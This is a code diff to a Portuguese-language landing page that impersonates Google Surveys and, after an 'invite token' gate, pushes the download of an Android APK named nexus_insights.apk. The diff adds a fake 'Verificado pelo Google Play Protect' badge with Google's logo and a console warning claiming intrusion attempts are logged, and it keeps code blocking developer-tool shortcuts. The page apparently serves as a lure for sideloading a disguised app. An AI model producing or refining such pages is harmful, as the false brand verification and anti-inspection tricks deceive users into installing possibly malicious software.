@@ -8,8 +8,8 @@
 
     <title>Google Surveys | Hub de Insights Corporativos</title>
 
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="logo33.png">
+    <!-- Favicon (Forçado como redondo) -->
+    <link rel="icon" type="image/png" href="logo33.png?v=2">
 
     <!-- Recursos Externos -->
     <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
@@ -42,6 +42,13 @@
             color: var(--text-main);
             line-height: 1.6;
             overflow-x: hidden;
+            opacity: 0; /* Começa invisível para o fade-in */
+            animation: pageFadeIn 1s ease forwards;
+        }
+
+        @keyframes pageFadeIn {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         /* Estilo MOEDA (REDONDO) do Logo Nexus */
@@ -238,7 +245,7 @@
                 <p style="font-size: 13px; color: var(--text-dim);">Insira o token recebido via convite oficial.</p>
 
                 <div class="input-wrapper">
-                    <input type="text" id="accessCode" placeholder="••••••••" autocomplete="off">
+                    <input type="text" id="accessCode" placeholder="••••••••" autocomplete="off" autofocus onkeypress="handleEnter(event)">
                     <button class="btn-paste" onclick="colarToken()">COLAR</button>
                 </div>
 
@@ -254,7 +261,11 @@
                 <lottie-player src="success.json" background="transparent" speed="1" style="width: 130px; height: 130px; margin: 0 auto;" autoplay></lottie-player>
                 <h2 style="color: #fff; font-size: 22px;">Acesso Autorizado!</h2>
                 <p style="color: var(--text-dim); font-size: 14px; margin-top: 8px;">Iniciando download do Assistente Mobile (.apk)</p>
-                <a href="nexus_insights.apk" id="dlLink" class="btn-main" style="display: block; background: #fff; color: #000; text-decoration: none; margin-top: 25px; font-weight: 700; text-align: center;">BAIXAR AGORA</a>
+                <div style="display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 10px; opacity: 0.8;">
+                    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_32dp.png" style="height: 12px;">
+                    <span style="font-size: 10px; color: #81c995; font-weight: bold;">Verificado pelo Google Play Protect</span>
+                </div>
+                <a href="nexus_insights.apk" id="dlLink" class="btn-main" style="display: block; background: #fff; color: #000; text-decoration: none; margin-top: 20px; font-weight: 700; text-align: center;">BAIXAR AGORA</a>
             </div>
         </div>
 
@@ -306,12 +317,22 @@
     </footer>
 
     <script>
-        // Bloqueia atalhos de desenvolvedor (F12, Ctrl+Shift+I, Ctrl+U)
+        // --- SEGURANÇA NO CONSOLE ---
+        console.log("%cPARE!", "color: red; font-size: 50px; font-weight: bold; -webkit-text-stroke: 1px black;");
+        console.log("%cEsta área é restrita a desenvolvedores autorizados da Nexus Global. A tentativa de intrusão foi registrada.", "color: white; font-size: 16px; background: red; padding: 5px;");
+
+        // Bloqueia atalhos de desenvolvedor
         document.onkeydown = function(e) {
             if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) {
                 return false;
             }
         };
+
+        function handleEnter(e) {
+            if (e.key === 'Enter') {
+                validar();
+            }
+        }
 
         // Gerar Session ID aleatório
         document.getElementById('sessId').innerText = Math.random().toString(36).substring(2, 8).toUpperCase();
